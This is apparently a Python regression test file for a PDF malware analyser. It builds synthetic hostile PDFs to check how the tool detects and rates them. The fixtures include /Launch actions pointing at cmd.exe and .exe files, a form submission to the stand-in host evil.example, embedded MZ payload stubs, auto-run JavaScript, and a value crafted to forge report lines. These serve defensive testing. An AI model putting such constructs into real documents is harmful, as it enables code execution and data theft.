"""Regression tests for hostile PDFs (final whole-branch review findings).

Run from the PDF_analyser folder:
    python3 -m unittest tests.test_hostile -v
"""
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)
sys.path.insert(0, HERE)

import pdfgen                                      # noqa: E402
from pdf_analyser_lib import extract as ex         # noqa: E402
from pdf_analyser_lib import output, pipeline, report  # noqa: E402
from pdf_analyser_lib.parser import load_pdf       # noqa: E402
from pdf_analyser_lib.utils import Colors, defang_text  # noqa: E402

SCRIPT = os.path.join(ROOT, "pdf_analyser.py")
CATALOG = "<< /Type /Catalog >>"


def write_pdf(d, objects, name="sample.pdf"):
    path = os.path.join(d, name)
    with open(path, "wb") as fh:
        fh.write(pdfgen.make_pdf(objects))
    return path


def analyse(objects):
    with tempfile.TemporaryDirectory() as d:
        return pipeline.analyse_pdf(write_pdf(d, objects))


def load(objects):
    with tempfile.TemporaryDirectory() as d:
        return load_pdf(write_pdf(d, objects))


def findings(result, keyword):
    return [f for f in result["findings"] if f["keyword"] == keyword]


class InlineActionTests(unittest.TestCase):
    """Finding 1: inline /A actions on annotations and widgets."""

    def test_inline_launch_is_medium(self):
        r = analyse({1: CATALOG,
                     2: "<< /Type /Annot /Subtype /Link /A << /S /Launch /F (cmd.exe) >> >>"})
        self.assertEqual(r["verdict"], "MEDIUM")
        self.assertEqual([f["target"] for f in findings(r, "/Launch")], ["cmd.exe"])

    def test_inline_submitform_external_is_high(self):
        r = analyse({1: CATALOG,
                     2: "<< /Type /Annot /Subtype /Widget /A << /S /SubmitForm "
                        "/F << /FS /URL /F (https://evil.example/c) >> >> >>"})
        self.assertEqual(r["verdict"], "HIGH")
        f = findings(r, "/SubmitForm")
        self.assertEqual((f[0]["severity"], f[0]["target"]), ("high", "https://evil.example/c"))

    def test_inline_uri_reported_as_info(self):
        r = analyse({1: CATALOG,
                     2: "<< /Type /Annot /Subtype /Link /A << /S /URI /URI (http://evil.example/x) >> >>"})
        self.assertEqual(r["verdict"], "LOW")
        f = findings(r, "/URI")
        self.assertEqual((f[0]["severity"], f[0]["target"]), ("info", "http://evil.example/x"))

    def test_actions_in_array_of_dicts(self):
        # pdf_parser merges the second dict of an array into its parent.
        pdf = load({1: "<< /Annots [ << /S /URI /URI (http://a.b) >> "
                       "<< /S /Launch /F (b.exe) >> ] >>",
                    2: "<< /S /GoTo /D [1 0 R /Fit] /Annots [ << /S /URI /URI (http://c.d) >> "
                       "<< /S /Launch /F (e.exe) >> ] >>"})
        got = sorted((a["object"], a["type"], a["target"]) for a in ex.find_actions(pdf))
        self.assertEqual(got, [(1, "/Launch", "b.exe"), (1, "/URI", "http://a.b"),
                               (2, "/Launch", "e.exe"), (2, "/URI", "http://c.d")])

    def test_inline_action_reported_once(self):
        pdf = load({1: "<< /OpenAction << /S /Launch /F (a.exe) >> >>"})
        self.assertEqual(len(ex.find_actions(pdf)), 1)


class InlineFilespecTests(unittest.TestCase):
    """Finding 2: embedded file reached through an inline filespec."""

    def test_inline_filespec_in_names_array(self):
        r = analyse({1: "<< /Type /Catalog /Names << /EmbeddedFiles << /Names [ (x) "
                        "<< /Type /Filespec /F (a.exe) /EF << /F 5 0 R >> >> ] >> >> >>",
                     5: pdfgen.stream_obj("", b"MZ\x90\x00payload")})
        self.assertEqual(r["verdict"], "HIGH")
        emb = [e for e in r["extracted"] if e["kind"] == "embedded_file"]
        self.assertEqual([(e["object"], e["name"]) for e in emb], [(5, "a.exe")])
        self.assertTrue(emb[0]["data"].startswith(b"MZ"))


class DeepNestingTests(unittest.TestCase):
    """Finding 3: a dict nested 5000 levels deep must not crash anything."""

    DEEP = {1: "<< /Type /Catalog /X " + "<< /A " * 5000 + "1 " + ">> " * 5000 + ">>"}

    def test_deep_dict_is_partial_not_crash(self):
        r = analyse(self.DEEP)
        self.assertTrue(r["partial"])
        self.assertTrue(any("RecursionError" in e for e in r["errors"]))

    def test_cli_never_prints_traceback(self):
        with tempfile.TemporaryDirectory() as d:
            path = write_pdf(d, self.DEEP)
            p = subprocess.run([sys.executable, SCRIPT, path], capture_output=True, text=True)
        self.assertIn(p.returncode, (0, 3))
        self.assertNotIn("Traceback", p.stdout + p.stderr)

    def test_walker_handles_deep_parsed_dict(self):
        deep = [("/S", ["/URI"]), ("/URI", ["(", "x", ")"])]
        for _ in range(5000):
            deep = [("/A", deep)]
        self.assertEqual(len(list(ex._walk_dicts(deep))), 5001)


class TriggerTests(unittest.TestCase):
    """Finding 4: /Next chains and document-level JavaScript."""

    def test_next_chain_inline_js_is_high(self):
        r = analyse({1: "<< /Type /Catalog /OpenAction << /S /GoTo /D [3 0 R /Fit] "
                        "/Next << /S /JavaScript /JS (app.alert\\(1\\)) >> >> >>",
                     3: "<< /Type /Page >>"})
        self.assertEqual(r["verdict"], "HIGH")
        self.assertEqual(findings(r, "/OpenAction")[0]["severity"], "high")

    def test_next_chain_by_reference_with_loop(self):
        pdf = load({1: "<< /OpenAction 2 0 R >>",
                    2: "<< /S /GoTo /D [5 0 R /Fit] /Next [3 0 R] >>",
                    3: "<< /S /GoTo /D [5 0 R /Fit] /Next 2 0 R /Next 4 0 R >>",
                    4: "<< /S /Launch /F (a.exe) >>",
                    5: "<< /Type /Page >>"})
        t = ex.find_triggers(pdf)
        self.assertEqual([(x["keyword"], x["action"], x["target_object"]) for x in t],
                         [("/OpenAction", "/Launch", 2)])

    def test_next_loop_without_active_action_terminates(self):
        pdf = load({1: "<< /OpenAction 2 0 R >>",
                    2: "<< /S /GoTo /D [5 0 R /Fit] /Next 3 0 R >>",
                    3: "<< /S /GoTo /D [5 0 R /Fit] /Next 2 0 R >>",
                    5: "<< /Type /Page >>"})
        self.assertEqual(ex.find_triggers(pdf)[0]["action"], "/GoTo")

    def test_destination_array_still_low(self):
        r = analyse({1: "<< /Type /Catalog /OpenAction [3 0 R /Fit] >>", 3: "<< /Type /Page >>"})
        self.assertEqual(r["verdict"], "LOW")

    def test_document_level_js_by_reference_and_kids(self):
        r = analyse({1: "<< /Type /Catalog /Names << /JavaScript 2 0 R >> >>",
                     2: "<< /Kids [6 0 R] >>",
                     6: "<< /Names [ (a) 3 0 R ] >>",
                     3: "<< /S /JavaScript /JS (app.alert\\(1\\)) >>"})
        self.assertEqual(r["verdict"], "HIGH")
        f = findings(r, "/Names")
        self.assertEqual((f[0]["severity"], f[0]["object"]), ("high", 1))
        self.assertEqual(f[0]["finding"], "Document-level JavaScript runs when the document opens")

    def test_document_level_js_inline(self):
        pdf = load({1: "<< /Type /Catalog /Names << /JavaScript << /Names [ (a) "
                       "<< /S /JavaScript /JS (x) >> ] >> >> >>"})
        self.assertEqual(ex.find_triggers(pdf), [{"object": 1, "objstm": None, "keyword": "/Names",
                                                  "action": "/JavaScript", "target_object": None}])

    def test_names_without_javascript_no_trigger(self):
        pdf = load({1: "<< /Type /Catalog /Names << /Dests 2 0 R >> >>", 2: "<< /Names [] >>"})
        self.assertEqual(ex.find_triggers(pdf), [])


class ReportForgeryTests(unittest.TestCase):
    """Finding 5: newlines in values cannot forge report lines."""

    def test_uri_with_newlines_stays_on_one_line(self):
        r = analyse({1: CATALOG,
                     2: "<< /S /URI /URI (x\\n\\n  HIGH   fake line\\n  Verdict : LOW) >>"})
        text = report.render(r, Colors(False))
        lines = text.splitlines()
        self.assertEqual(sum(1 for l in lines if l.startswith("  Verdict")), 1)
        self.assertFalse(any("fake line" in l and not l.strip().startswith("Target:")
                             for l in lines))
        self.assertIn("Target: x\\n\\n  HIGH   fake line\\n  Verdict : LOW", text)


class LongNameTests(unittest.TestCase):
    """Finding 6: a 400-character embedded name must not break -out."""

    def test_long_name_capped(self):
        res = {"file": "a.pdf", "sha256": "0" * 64, "size": 1, "verdict": "LOW",
               "encrypted": False, "partial": False, "errors": [], "findings": [],
               "extracted": [{"object": 3, "kind": "embedded_file", "name": "A" * 400 + ".txt",
                              "data": b"x"},
                             {"object": 4, "kind": "richmedia", "name": None, "data": b"y"}]}
        with tempfile.TemporaryDirectory() as d:
            written = output.write_outputs(res, Path(d))
            names = [p.name for p in written]
        self.assertEqual(len(written), 3)
        self.assertEqual(names[1], "obj3_embedded_" + "A" * 100 + ".bin")


class DefangTests(unittest.TestCase):
    """Finding 8: a scheme glued to a preceding character is still defanged."""

    def test_defang_after_digit(self):
        self.assertEqual(defang_text("1http://evil.com/a"), "1hxxp://evil[.]com/a")
        self.assertEqual(defang_text("x_https://evil.com"), "x_hxxps://evil[.]com")


class NestedObjStmTests(unittest.TestCase):
    """Finding 9: an /ObjStm inside an /ObjStm makes the parse partial."""

    def test_nested_objstm_is_partial(self):
        inner = ("<< /Type /ObjStm /N 1 /First 4 /Length 12 >>\nstream\n7 0 << /A 1 >>"
                 "\nendstream")
        pdf = load({1: CATALOG, 5: pdfgen.objstm_obj({6: inner})})
        self.assertIn(6, pdf.objects)
        self.assertTrue(pdf.partial)
        self.assertTrue(any("/ObjStm inside an /ObjStm" in e for e in pdf.errors))


class ScriptBytesTests(unittest.TestCase):
    """Finding 10: a script from a stream is saved byte-exact."""

    def test_stream_script_bytes_exact(self):
        raw = b"var s = '\xe9\xff';"
        r = analyse({1: CATALOG, 2: "<< /S /JavaScript /JS 3 0 R >>",
                     3: pdfgen.stream_obj("", raw)})
        js = [e for e in r["extracted"] if e["kind"] == "javascript"]
        self.assertEqual(js[0]["data"], raw)

    def test_inline_script_still_utf8(self):
        r = analyse({1: CATALOG, 2: "<< /S /JavaScript /JS (\\351) >>"})
        js = [e for e in r["extracted"] if e["kind"] == "javascript"]
        self.assertEqual(js[0]["data"], "\xe9".encode("utf-8"))


if __name__ == "__main__":
    unittest.main()
